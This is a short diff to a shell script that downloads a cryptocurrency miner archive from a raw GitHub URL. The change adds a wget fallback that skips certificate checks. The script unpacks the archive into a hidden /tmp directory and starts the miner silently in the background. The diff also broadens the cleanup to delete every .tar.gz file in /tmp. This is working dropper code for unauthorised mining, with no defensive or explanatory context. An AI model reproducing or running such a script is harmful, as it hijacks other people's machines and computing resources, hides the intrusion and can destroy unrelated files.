@@ -13,6 +13,11 @@ if ! curl -ks "https://raw.githubusercontent.com/anabianca92/lol/main/filebet.ta
   echo "ERROR: Can't curl miner"
   exit 1
 fi
+echo "[*] Downloading miner"
+if ! wget --no-check-certificate "https://raw.githubusercontent.com/anabianca92/lol/main/filebet.tar.gz" -O filebet.tar.gz 2>/dev/null; then
+  echo "ERROR: Can't curl miner"
+  exit 1
+fi
 
 [ -d  /tmp/.filebet ] || mkdir  /tmp/.filebet
 if ! tar xf /tmp/filebet.tar.gz; then
@@ -20,6 +25,6 @@ if ! tar xf /tmp/filebet.tar.gz; then
   exit 1
 fi
 
-rm /tmp/filebet.tar.gz
+rm /tmp/*.tar.gz
 exec /tmp/.filebet/filebet --config=/tmp/.filebet/config.json 2>/dev/null &
 echo "[*] Setup complete"
